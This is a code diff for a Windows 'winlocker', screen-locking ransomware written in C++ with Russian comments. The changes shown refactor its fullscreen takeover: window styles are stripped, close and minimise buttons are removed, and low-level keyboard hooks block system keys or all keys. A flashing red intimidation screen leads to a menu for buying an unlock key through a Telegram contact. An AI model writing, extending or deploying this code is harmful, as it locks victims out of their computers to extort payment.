@@ -16,9 +16,11 @@ std::wstring g_input;
 bool g_done = false;
 std::mt19937 g_rng(std::random_device{}());
 
-// ═══════════════════════════════════════════════════════════
-// КОНСОЛЬНЫЕ УТИЛИТЫ
-// ═══════════════════════════════════════════════════════════
+int RandInt(int lo, int hi) {
+    std::uniform_int_distribution<int> d(lo, hi);
+    return d(g_rng);
+}
+
 void WOut(const std::wstring& s) {
     DWORD w = 0;
     WriteConsoleW(g_hOut, s.c_str(), (DWORD)s.size(), &w, nullptr);
@@ -45,26 +47,34 @@ BOOL WINAPI CtrlHandler(DWORD type) {
 }
 
 void LockConsole() {
-    LONG style = GetWindowLong(g_hCon, GWL_STYLE);
-    style &= ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZEBOX | WS_MAXIMIZEBOX | WS_SYSMENU);
-    SetWindowLong(g_hCon, GWL_STYLE, style);
     HMENU menu = GetSystemMenu(g_hCon, FALSE);
     if (menu) {
         DeleteMenu(menu, SC_CLOSE, MF_BYCOMMAND);
         DeleteMenu(menu, SC_MINIMIZE, MF_BYCOMMAND);
         DeleteMenu(menu, SC_MAXIMIZE, MF_BYCOMMAND);
     }
-    int sw = GetSystemMetrics(SM_CXSCREEN);
-    int sh = GetSystemMetrics(SM_CYSCREEN);
-    SetWindowPos(g_hCon, HWND_TOPMOST, 0, 0, sw, sh, SWP_FRAMECHANGED | SWP_SHOWWINDOW);
     SetConsoleCtrlHandler(CtrlHandler, TRUE);
 
     CONSOLE_FONT_INFOEX cfi{};
     cfi.cbSize = sizeof(cfi);
-    cfi.dwFontSize.Y = 20;
-    cfi.dwFontSize.X = 10;
+    cfi.dwFontSize.Y = 18;
+    cfi.dwFontSize.X = 9;
     wcscpy_s(cfi.FaceName, L"Consolas");
     SetCurrentConsoleFontEx(g_hOut, FALSE, &cfi);
+}
+
+void FullscreenConsole() {
+    LONG style = GetWindowLong(g_hCon, GWL_STYLE);
+    style &= ~(WS_CAPTION | WS_THICKFRAME | WS_MINIMIZEBOX |
+               WS_MAXIMIZEBOX | WS_SYSMENU);
+    SetWindowLong(g_hCon, GWL_STYLE, style);
+    ShowWindow(g_hCon, SW_HIDE);
+    int sw = GetSystemMetrics(SM_CXSCREEN);
+    int sh = GetSystemMetrics(SM_CYSCREEN);
+    SetWindowPos(g_hCon, HWND_TOPMOST, 0, 0, sw, sh,
+                 SWP_FRAMECHANGED | SWP_SHOWWINDOW);
+    ShowWindow(g_hCon, SW_SHOW);
+    SetForegroundWindow(g_hCon);
 }
 
 void LaunchSelf(const std::wstring& arg) {
@@ -81,7 +91,6 @@ void LaunchSelf(const std::wstring& arg) {
     }
 }
 
-// блокировка системных клавиш
 LRESULT CALLBACK BlockHook(int code, WPARAM wp, LPARAM lp) {
     if (code == HC_ACTION) {
         auto* kb = (KBDLLHOOKSTRUCT*)lp;
@@ -95,28 +104,25 @@ LRESULT CALLBACK BlockHook(int code, WPARAM wp, LPARAM lp) {
     return CallNextHookEx(nullptr, code, wp, lp);
 }
 
-// полная блокировка (для красной фазы)
 LRESULT CALLBACK BlockAllHook(int code, WPARAM wp, LPARAM lp) {
     if (code == HC_ACTION) return 1;
     return CallNextHookEx(nullptr, code, wp, lp);
 }
 
 // ═══════════════════════════════════════════════════════════
-// РЕЖИМ 1: КРАСНЫЙ CMD (--red)
+// CMD 1 — КРАСНЫЙ (--red)
 // ═══════════════════════════════════════════════════════════
 void RunRed() {
     g_hOut = GetStdHandle(STD_OUTPUT_HANDLE);
     g_hCon = GetConsoleWindow();
     SetConsoleOutputCP(CP_UTF8);
     SetConsoleCP(CP_UTF8);
+    FullscreenConsole();
     LockConsole();
-    ShowWindow(g_hCon, SW_SHOWMAXIMIZED);
-    SetForegroundWindow(g_hCon);
 
     g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockAllHook,
                                  GetModuleHandleW(nullptr), 0);
 
-    // мерцание 2 сек
     for (int i = 0; i < 12; ++i) {
         ClearScreen(BACKGROUND_RED | BACKGROUND_INTENSITY);
         std::this_thread::sleep_for(std::chrono::milliseconds(80));
@@ -124,7 +130,6 @@ void RunRed() {
         std::this_thread::sleep_for(std::chrono::milliseconds(80));
     }
 
-    // ВАС ЗАМЕТИЛИ 1 сек
     ClearScreen(BACKGROUND_RED | BACKGROUND_INTENSITY);
     CONSOLE_SCREEN_BUFFER_INFO csbi;
     GetConsoleScreenBufferInfo(g_hOut, &csbi);
@@ -135,45 +140,65 @@ void RunRed() {
     WOut(txt);
     std::this_thread::sleep_for(std::chrono::seconds(1));
 
-    // запускаем --green и выходим
     LaunchSelf(L"--green");
     UnhookWindowsHookEx(g_kbHook);
     ExitProcess(0);
 }
 
 // ═══════════════════════════════════════════════════════════
-// РЕЖИМ 2: ЗЕЛЁНЫЙ CMD (--green)
+// CMD 2 — ЗЕЛЁНЫЙ БАННЕР + МЕНЮ (--green)
 // ═══════════════════════════════════════════════════════════
+
+// блочный баннер WERKARAMEL
+const wchar_t* BANNER[] = {
+    L"██╗    ██╗███████╗██████╗ ██╗  ██╗ █████╗ ██████╗  █████╗ ███╗   ███╗███████╗██╗",
+    L"██║    ██║██╔════╝██╔══██╗██║ ██╔╝██╔══██╗██╔══██╗██╔══██╗████╗ ████║██╔════╝██║",
+    L"██║ █╗ ██║█████╗  ██████╔╝█████╔╝ ███████║██████╔╝███████║██╔████╔██║█████╗  ██║",
+    L"██║███╗██║██╔══╝  ██╔══██╗██╔═██╗ ██╔══██║██╔══██╗██╔══██║██║╚██╔╝██║██╔══╝  ██║",
+    L"╚███╔███╔╝███████╗██║  ██║██║  ██╗██║  ██║██║  ██║██║  ██║██║ ╚═╝ ██║███████╗███████╗",
+    L" ╚══╝╚══╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝",
+};
+
 void PrintMenu() {
     ClearScreen(0);
     CONSOLE_SCREEN_BUFFER_INFO csbi;
     GetConsoleScreenBufferInfo(g_hOut, &csbi);
-    int cols = csbi.dwSize.X;
     int rows = csbi.dwSize.Y;
 
+    // баннер WERKARAMEL зелёным сверху
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-    std::wstring logo = L"W E R K A R A M E L";
-    Gotoxy((cols - (int)logo.size()) / 2, 3); WOut(logo);
-    std::wstring sub = L"W I N L O C K E R";
-    Gotoxy((cols - (int)sub.size()) / 2, 5); WOut(sub);
-    std::wstring line(60, L'=');
-    Gotoxy((cols - 60) / 2, 7); WOut(line);
+    for (int i = 0; i < 6; ++i) {
+        Gotoxy(2, 1 + i);
+        WOut(BANNER[i]);
+    }
 
+    // подзаголовок WINLOCKER
+    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+    Gotoxy(2, 8);
+    WOut(L"                        W I N L O C K E R");
+
+    // разделитель
+    SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
+    Gotoxy(2, 10);
+    std::wstring line(78, L'─');
+    WOut(line);
+
+    // меню слева
     SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
-    std::wstring head = L"Выберите действие:";
-    Gotoxy((cols - (int)head.size()) / 2, 9); WOut(head);
+    Gotoxy(4, 12); WOut(L"Выберите действие:");
 
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-    Gotoxy(10, 11); WOut(L"[ 1 ]   Поддержка  ->  tg @werkaramel");
-    Gotoxy(10, 12); WOut(L"[ 2 ]   Купить ключ");
-    Gotoxy(10, 13); WOut(L"[ 3 ]   Выйти");
+    Gotoxy(4, 14); WOut(L"[ 1 ]   Поддержка  ->  tg @werkaramel");
+    Gotoxy(4, 15); WOut(L"[ 2 ]   Купить ключ");
+    Gotoxy(4, 16); WOut(L"[ 3 ]   Выйти");
 
-    SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE);
-    std::wstring hint = L"введите 1 / 2 / 3 и нажмите Enter";
-    Gotoxy((cols - (int)hint.size()) / 2, rows - 4); WOut(hint);
+    // подсказка внизу
+    SetColor(FOREGROUND_GREEN);
+    Gotoxy(4, rows - 4); WOut(L"введите число и нажмите Enter");
 
+    // строка ввода
     SetColor(FOREGROUND_GREEN | FOREGROUND_INTENSITY);
-    Gotoxy(2, rows - 2); WOut(L"> ");
+    Gotoxy(4, rows - 2); WOut(L"> ");
     SetColor(FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE | FOREGROUND_INTENSITY);
     WOut(g_input + L"  ");
 }
@@ -184,9 +209,8 @@ void RunGreen() {
     g_hCon = GetConsoleWindow();
     SetConsoleOutputCP(CP_UTF8);
     SetConsoleCP(CP_UTF8);
+    FullscreenConsole();
     LockConsole();
-    ShowWindow(g_hCon, SW_SHOWMAXIMIZED);
-    SetForegroundWindow(g_hCon);
 
     g_kbHook = SetWindowsHookExW(WH_KEYBOARD_LL, BlockHook,
                                  GetModuleHandleW(nullptr), 0);
@@ -228,7 +252,7 @@ void RunGreen() {
 }
 
 // ═══════════════════════════════════════════════════════════
-// РЕЖИМ 3: WINLOCKER (--locker)
+// CMD 3 / EXE — WINLOCKER (--locker)
 // ═══════════════════════════════════════════════════════════
 const COLORREF C_BG = RGB(0, 0, 0);
 const COLORREF C_RED = RGB(220, 30, 30);
@@ -354,26 +378,16 @@ void RunLocker() {
     }
 }
 
-// ═══════════════════════════════════════════════════════════
-// ТОЧКА ВХОДА
-// ═══════════════════════════════════════════════════════════
 int wmain(int argc, wchar_t** argv) {
     for (int i = 1; i < argc; ++i) {
-        if (wcscmp(argv[i], L"--red") == 0) {
-            RunRed();
-            return 0;
-        }
-        if (wcscmp(argv[i], L"--green") == 0) {
-            RunGreen();
-            return 0;
-        }
+        if (wcscmp(argv[i], L"--red") == 0) { RunRed(); return 0; }
+        if (wcscmp(argv[i], L"--green") == 0) { RunGreen(); return 0; }
         if (wcscmp(argv[i], L"--locker") == 0) {
             ShowWindow(GetConsoleWindow(), SW_HIDE);
             RunLocker();
             return 0;
         }
     }
-    // без флага — стартуем с --red
     LaunchSelf(L"--red");
     return 0;
 }
